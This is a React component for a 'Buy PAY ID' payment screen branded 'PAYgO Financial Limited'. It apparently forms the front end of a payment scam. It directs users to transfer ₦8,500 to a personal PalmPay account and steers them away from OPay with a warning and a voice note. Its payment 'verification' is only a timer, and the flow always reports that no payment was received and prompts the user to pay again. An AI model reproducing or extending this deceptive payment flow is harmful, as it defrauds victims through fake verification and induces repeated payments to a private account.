"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { ArrowLeft, Volume2, Upload, CheckCircle, Copy } from "lucide-react"
import { useState, useRef } from "react"
import Image from "next/image"

interface BuyPayIdScreenProps {
  userName: string
  userEmail: string
  onBack: () => void
}

export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayIdScreenProps) {
  const [isProcessing, setIsProcessing] = useState(false)
  const [showMessage, setShowMessage] = useState(false)
  const [showWarning, setShowWarning] = useState(false)
  const [isUnderstanding, setIsUnderstanding] = useState(false)
  const [showPaymentPage, setShowPaymentPage] = useState(false)
  const [showPaymentDetails, setShowPaymentDetails] = useState(false)
  const [uploadedReceipt, setUploadedReceipt] = useState<File | null>(null)
  const [isSubmittingPayment, setIsSubmittingPayment] = useState(false)
  const [showPaymentNotReceived, setShowPaymentNotReceived] = useState(false)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const audioRef = useRef<HTMLAudioElement>(null)

  const paymentDetails = {
    bankName: "PALMPAY",
    accountNumber: "8998790636",
    accountName: "ELOM CYNTHIA OBIANUJU",
  }

  const handlePay = () => {
    setIsProcessing(true)
    setShowMessage(true)

    setTimeout(() => {
      setIsProcessing(false)
      setShowMessage(false)
      setShowWarning(true)
    }, 6000)
  }

  const playVoiceNote = () => {
    if ("speechSynthesis" in window) {
      const utterance = new SpeechSynthesisUtterance(
        "OPay Bank is highly prohibited for making payment, and you should either use POS TERMINAL or other bank account.",
      )
      utterance.rate = 0.8
      utterance.pitch = 1
      speechSynthesis.speak(utterance)
    }
  }

  const handleUnderstand = () => {
    setIsUnderstanding(true)

    setTimeout(() => {
      setIsUnderstanding(false)
      setShowWarning(false)
      setShowPaymentDetails(true)
    }, 6000)
  }

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(field)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (file) {
      setUploadedReceipt(file)
    }
  }

  const handleMadePayment = () => {
    setIsSubmittingPayment(true)

    setTimeout(() => {
      setIsSubmittingPayment(false)
      setShowPaymentDetails(false)
      setShowPaymentNotReceived(true)
    }, 6000)
  }

  const handleResubmit = () => {
    setUploadedReceipt(null)
    setShowPaymentNotReceived(false)
    setShowPaymentDetails(true)
  }

  if (showPaymentNotReceived) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-200 via-pink-100 to-orange-100">
        <div className="bg-gradient-to-r from-purple-600 to-orange-500 px-4 py-6">
          <div className="flex items-center space-x-4 mb-4">
            <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-purple-500">
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-white text-xl font-semibold">Payment Status</h1>
          </div>
        </div>

        <div className="px-4 py-8">
          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-sm mx-auto">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <div className="text-white text-3xl font-bold">×</div>
              </div>
              <h2 className="text-orange-500 text-xl font-bold mb-2">Transaction verification failed!</h2>
              <p className="text-gray-800 text-sm font-medium mb-1">Your payment could not be completed.</p>
              <p className="text-gray-600 text-sm">Reason: No Payment received from you/ invalid payment method.</p>
            </div>

            <div className="mb-6">
              <div className="relative">
                <input
                  type="password"
                  value="••••••••••••••"
                  readOnly
                  className="w-full p-3 border border-gray-300 rounded-lg bg-gray-50 text-center"
                />
                <button className="absolute right-3 top-1/2 transform -translate-y-1/2">
                  <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                    />
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                    />
                  </svg>
                </button>
              </div>
            </div>

            <div className="space-y-3">
              <Button
                onClick={handleResubmit}
                className="w-full bg-gradient-to-r from-purple-600 to-orange-500 hover:from-purple-700 hover:to-orange-600 text-white py-3 rounded-lg font-semibold"
              >
                Try Again
              </Button>

              <Button
                onClick={onBack}
                variant="outline"
                className="w-full border-gray-300 text-gray-700 hover:bg-gray-50 bg-transparent py-3 rounded-lg font-semibold"
              >
                Go to Dashboard
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (showPaymentDetails) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-200 via-pink-100 to-orange-100">
        <div className="bg-gradient-to-r from-purple-600 to-orange-500 px-4 py-6">
          <div className="flex items-center space-x-4 mb-4">
            <Button
              onClick={() => setShowPaymentDetails(false)}
              variant="ghost"
              size="icon"
              className="text-white hover:bg-purple-500"
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-white text-xl font-semibold">Complete Payment</h1>
          </div>
        </div>

        <div className="px-4 py-8">
          <div className="bg-white rounded-2xl p-4 shadow-lg max-w-sm mx-auto">
            <h2 className="text-gray-800 text-lg font-semibold mb-4 text-center">Payment Instructions</h2>

            {/* Account Details */}
            <div className="space-y-3 mb-4">
              <div className="bg-gray-50 rounded-2xl p-3">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Bank Name</p>
                    <p className="font-bold text-gray-800">{paymentDetails.bankName}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(paymentDetails.bankName, "bank")}
                    className="text-purple-600 hover:bg-purple-50"
                  >
                    {copiedField === "bank" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
              </div>

              <div className="bg-gray-50 rounded-2xl p-3">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Account Number</p>
                    <p className="font-bold text-gray-800 font-mono">{paymentDetails.accountNumber}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(paymentDetails.accountNumber, "account")}
                    className="text-purple-600 hover:bg-purple-50"
                  >
                    {copiedField === "account" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
              </div>

              <div className="bg-gray-50 rounded-2xl p-3">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Account Name</p>
                    <p className="font-bold text-gray-800">{paymentDetails.accountName}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(paymentDetails.accountName, "name")}
                    className="text-purple-600 hover:bg-purple-50"
                  >
                    {copiedField === "name" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
              </div>

              <div className="bg-purple-50 rounded-2xl p-3 border border-purple-200">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-purple-600">Amount to Pay</p>
                    <p className="font-bold text-purple-800 text-xl">₦8,500.00</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy("8500", "amount")}
                    className="text-purple-600 hover:bg-purple-100"
                  >
                    {copiedField === "amount" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
              </div>
            </div>

            {/* Receipt Upload */}
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 mb-2">Upload Payment Receipt</label>
              <div
                onClick={() => fileInputRef.current?.click()}
                className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center cursor-pointer hover:border-purple-400 hover:bg-purple-50 transition-colors"
              >
                <input ref={fileInputRef} type="file" accept="image/*" onChange={handleFileUpload} className="hidden" />
                {uploadedReceipt ? (
                  <div className="flex items-center justify-center space-x-2 text-green-600">
                    <CheckCircle className="h-5 w-5" />
                    <span className="text-sm font-medium">{uploadedReceipt.name}</span>
                  </div>
                ) : (
                  <div>
                    <Upload className="h-6 w-6 text-gray-400 mx-auto mb-2" />
                    <p className="text-sm text-gray-600">Click to upload receipt</p>
                    <p className="text-xs text-gray-500 mt-1">PNG, JPG up to 10MB</p>
                  </div>
                )}
              </div>
            </div>

            {isSubmittingPayment && (
              <div className="mb-4 p-4 bg-purple-50 border border-purple-200 rounded-lg">
                <div className="text-center">
                  <div className="text-purple-800 text-lg font-semibold mb-2">Confirming Payment</div>
                  <div className="flex justify-center mb-3">
                    <div className="w-12 h-12 border-4 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
                  </div>
                  <div className="text-gray-600 text-sm mb-3">Confirming Your Payment</div>
                  <div className="text-gray-500 text-xs mb-3">Please wait while we verify your transaction...</div>
                  <div className="w-full bg-gray-200 rounded-full h-2 mb-2">
                    <div className="bg-orange-500 h-2 rounded-full animate-pulse" style={{ width: "30%" }}></div>
                  </div>
                  <div className="text-gray-500 text-xs">
                    This may take a few moments
                    <br />
                    Please do not close this page
                  </div>
                </div>
              </div>
            )}

            <Button
              onClick={handleMadePayment}
              disabled={!uploadedReceipt || isSubmittingPayment}
              className="w-full bg-gradient-to-r from-purple-600 to-orange-500 hover:from-purple-700 hover:to-orange-600 text-white py-3 rounded-lg font-semibold mb-4"
            >
              {isSubmittingPayment ? "Verifying..." : "I'VE MADE PAYMENT"}
            </Button>

            <div className="text-center text-gray-500 text-sm">PAYgO Financial Limited</div>
          </div>
        </div>
      </div>
    )
  }

  if (showPaymentPage) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
        <div className="bg-gradient-to-r from-purple-600 to-purple-700 px-4 py-6">
          <div className="flex items-center space-x-4 mb-4">
            <Button
              onClick={() => setShowPaymentPage(false)}
              variant="ghost"
              size="icon"
              className="text-white hover:bg-purple-500"
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-white text-xl font-semibold">Select Payment Method</h1>
          </div>
        </div>

        <div className="px-4 py-8">
          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
            <h2 className="text-gray-800 text-lg font-semibold mb-6 text-center">Choose Your Bank</h2>

            <div className="space-y-3">
              {["Access Bank", "First Bank", "GTBank", "Zenith Bank", "Kuda", "Moniepoint", "Palmpay"].map((bank) => (
                <Button
                  key={bank}
                  variant="outline"
                  className="w-full justify-start p-4 h-auto border-2 hover:border-purple-500 hover:bg-purple-50 bg-transparent"
                >
                  <span className="text-gray-700 font-medium">{bank}</span>
                </Button>
              ))}
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (showWarning) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
        <div className="bg-gradient-to-r from-red-600 to-red-700 px-4 py-6">
          <div className="flex items-center space-x-4 mb-4">
            <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-red-500">
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-white text-xl font-semibold">Payment Warning</h1>
          </div>
        </div>

        <div className="px-4 py-8">
          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
            <div className="text-center mb-6">
              <div className="w-20 h-20 mx-auto mb-4 relative">
                <Image src="/opay-logo.png" alt="OPay Logo" fill className="object-contain" />
              </div>
              <div className="text-4xl mb-4">🚫</div>
              <h2 className="text-red-600 text-xl font-bold mb-4">Important Notice</h2>
            </div>

            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
              <p className="text-red-800 text-center font-medium">
                OPay Bank is highly prohibited for making payment, and you should either use POS TERMINAL or other bank
                account.
              </p>
            </div>

            <div className="flex justify-center mb-6">
              <Button
                onClick={playVoiceNote}
                variant="outline"
                className="flex items-center space-x-2 border-purple-300 text-purple-600 hover:bg-purple-50 bg-transparent"
              >
                <Volume2 className="h-4 w-4" />
                <span>🎵 Listen to Voice Note</span>
              </Button>
            </div>

            {isUnderstanding && (
              <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex items-center justify-center space-x-2">
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                  <span className="text-blue-800 text-sm">Processing your understanding...</span>
                </div>
              </div>
            )}

            <Button
              onClick={handleUnderstand}
              disabled={isUnderstanding}
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white py-3 rounded-lg font-semibold"
            >
              {isUnderstanding ? "Processing..." : "I UNDERSTAND"}
            </Button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
      {/* Header */}
      <div className="bg-gradient-to-r from-purple-600 to-purple-700 px-4 py-6">
        <div className="flex items-center space-x-4 mb-4">
          <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-purple-500">
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <h1 className="text-white text-xl font-semibold">Buy PAY ID</h1>
        </div>
      </div>

      {/* Content */}
      <div className="px-4 py-8">
        <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
          <h2 className="text-gray-800 text-lg font-semibold mb-6 text-center">Payment Details</h2>

          <div className="space-y-4 mb-8">
            <div>
              <label className="text-gray-600 text-sm font-medium">User Name</label>
              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
                <span className="text-gray-800">{userName}</span>
              </div>
            </div>

            <div>
              <label className="text-gray-600 text-sm font-medium">Email</label>
              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
                <span className="text-gray-800">{userEmail}</span>
              </div>
            </div>

            <div>
              <label className="text-gray-600 text-sm font-medium">Amount</label>
              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
                <span className="text-gray-800 font-semibold">₦8,500.00</span>
              </div>
            </div>
          </div>

          {showMessage && (
            <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
              <div className="flex items-center space-x-2">
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                <span className="text-blue-800 text-sm">Preparing Payment Account...</span>
              </div>
            </div>
          )}

          <Button
            onClick={handlePay}
            disabled={isProcessing}
            className="w-full bg-gradient-to-r from-purple-600 to-orange-500 hover:from-purple-700 hover:to-orange-600 text-white py-3 rounded-lg font-semibold"
          >
            {isProcessing ? "Processing..." : "PAY"}
          </Button>
        </div>
      </div>
    </div>
  )
}
